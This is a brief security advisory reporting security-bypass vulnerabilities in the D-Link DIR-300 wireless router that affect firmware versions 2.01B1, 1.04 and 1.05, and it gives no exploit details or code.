The D-Link DIR-300 wireless router is prone to multiple security-bypass vulnerabilities.

Remote attackers can exploit these issues to bypass security restrictions, access certain administrative functions, alter configuration, and compromise the affected device.

D-Link DIR-300 running firmware 2.01B1, 1.04, 1.05 are vulnerable. Additional models and firmware versions may also be affected.
